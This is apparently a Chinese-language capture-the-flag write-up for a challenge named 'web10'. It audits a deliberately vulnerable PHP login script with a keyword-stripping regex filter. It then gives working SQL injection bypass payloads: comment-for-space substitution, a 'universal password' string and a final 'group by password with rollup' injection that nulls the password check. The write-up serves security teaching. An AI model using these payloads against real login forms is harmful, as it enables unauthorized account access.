# web10
```
<?php
		$flag="";
        function replaceSpecialChar($strParam){
             $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
             return preg_replace($regex,"",$strParam);
        }
        if (!$con)
        {
            die('Could not connect: ' . mysqli_error());
        }
		if(strlen($username)!=strlen(replaceSpecialChar($username))){
			die("sql inject error");
		}
		if(strlen($password)!=strlen(replaceSpecialChar($password))){
			die("sql inject error");
		}
		$sql="select * from user where username = '$username'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}

					 }
			}
    ?>

```
照上题一样,可以点击取消下载备份文件
审计代码
这里对一些sql关键词做了置空操作
且账号密码都进行了正则匹配,但最后只用了账号查询,在账号上进行注入
```
preg_replace($regex,"",$strParam)
```
可以想到是简单的双写绕过
有正则匹配,大小写无法绕过,这里思考一下正则没有匹配多行还是单行,可能多行匹配能绕过%0a
但是正则出现\s
\s表示,出现空白就匹配,空白指空格,换行,tab缩进等所有空白
\S表示,非空白就匹配
/**/过滤空白
但本题不需要暴库,那么就不需要双写了
直接万能密码,没有触发函数
```
1'or/**/1=1#
```

但这里还有个问题,查询的得到的结果集会对输入的password进行比对
```
if($password==$row['password']){
							echo "登陆成功<br>";
							echo $flag;
						}
```
这里思索一下首先万能密码注入会得到所有用户的结果集,再对他们的密码进行匹配最终才能得到flag
怎么绕过呢?注意到这里是弱比较,应该可以对密码进行爆破来匹配相等
弱比较:弱比较操作符会在比较之前将两边的值转换为相同的类型，然后再进行比较。它只比较值，不比较类型
例如:
```
var_dump(12 == "12"); // true
var_dump(12 == "12abc"); // true
var_dump("admin" == 0); // true
//字符串会被转换为数字进行比较。如果字符串以数字开头，则取开头的数字作为转换结果；
//如果字符串不能转换为数字或为空（null），则转换为0
```
那么最后,bp抓包,然后导入数字字典,进行爆破,理想出现全为字符的密码与0相等.

但这里好像跑不出,看了一眼题解,发现需要使用group by和with rollup
group by passsword会按照passwor的值排列
with rollup 表示统计

select password,count(*)group by passsword with rollup 这样查询到的password值会多出一行null
a'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#
![](vx_images/513872852629029.png)
